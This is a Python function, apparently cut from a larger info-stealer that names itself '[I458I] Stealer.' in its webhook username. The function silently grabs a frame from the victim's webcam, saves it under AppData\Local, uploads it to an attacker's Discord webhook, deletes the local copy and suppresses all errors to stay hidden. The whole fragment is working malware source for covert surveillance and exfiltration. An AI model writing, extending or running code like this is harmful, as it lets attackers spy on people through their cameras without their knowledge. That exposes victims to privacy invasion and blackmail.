def saycheese():
    try:
     x=cv2.VideoCapture(0)
     if x.isOpened():
         ret, frame = x.read()
         osadf=os.path.join(os.path.expanduser("~"), "AppData", "Local", "cooked.png")
         xyz = cv2.imwrite(osadf, frame)
         with open(osadf, "rb") as filen:
            x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
            x.add_file(file=filen.read(), filename="cooked.png")
         x.execute()
         os.remove(osadf)
    except:pass